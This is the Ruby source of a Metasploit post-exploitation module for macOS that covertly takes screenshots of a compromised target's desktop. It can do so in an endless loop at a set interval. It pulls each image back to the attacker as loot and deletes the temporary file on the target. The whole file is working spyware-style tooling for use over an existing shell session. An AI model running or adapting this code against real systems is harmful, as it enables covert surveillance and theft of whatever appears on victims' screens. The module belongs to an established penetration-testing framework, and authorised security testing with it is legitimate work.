##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OSX Screen Capture',
        'Description'   => %q{
          This module takes screenshots of target desktop and automatically downloads them.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Peter Toth <globetother[at]gmail.com>'
          ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell' ]
      ))

    register_options(
      [
        OptEnum.new('SNAP_FILETYPE',
          [true, 'File format to use when saving a snapshot', 'png', %w(png gif)]
        ),
        OptInt.new('DELAY', [false, 'Interval between screenshots in seconds. 0 for no delay', 10]),
        OptInt.new('COUNT', [false, 'Number of screenshots to collect. 0 for for no count', 1]),
        OptString.new('LATEST_FILE', [false, 'Path to local file which will point to the latest downloaded screenshot', ''])
      ], self.class)

  end

  def run
    if datastore['COUNT'] == nil || datastore['COUNT'] == 0
      begin
        get_screenshot("Screenshot")
        delay()
      end until false
    else
      count = datastore['COUNT']
      count.times do |num|
        get_screenshot("Screenshot " + (num+1).to_s() + "/#{count}")
        delay() unless ((num+1) == count)
      end
    end
  end

  def get_screenshot(msg)
    filename = Rex::Text.rand_text_alpha(7) + "." + datastore['SNAP_FILETYPE']
    file = Dir::tmpdir + "/" + filename

    execute("Save screenshot to remote temp folder:", "screencapture -C -t " + datastore['SNAP_FILETYPE'] + " " + file)
    data = cat_file(file)
    loot_file = save(msg, data, filename)
    execute("Remove remote temp file:", "rm " + file)
  end

  def delay()
    if datastore['DELAY'] != nil && datastore['DELAY'] != 0
      vprint_status("Delaying for " + datastore['DELAY'].to_s() + " seconds")
      Rex.sleep(datastore['DELAY'])
    end
  end

  def save(msg, data, filename, ctype="image/" + datastore['SNAP_FILETYPE'])
    ltype = "osx.screenshot"
    loot_file = store_loot(ltype, ctype, session, data, filename, msg)
    print_good("#{msg} stored in #{loot_file.to_s}")
    if datastore['LATEST_FILE'] != ''
      print_status("Updated #{datastore['LATEST_FILE']}")
      FileUtils.cp(loot_file.to_s(), datastore['LATEST_FILE'])
    end
  end

  def execute(msg, cmd)
    vprint_status("#{msg} #{cmd}")
    output = cmd_exec(cmd)
    return output
  end

  def cat_file(filename)
    print_status("Downloading screenshot: #{filename}")
    data = read_file(filename)
    return data
  end

end
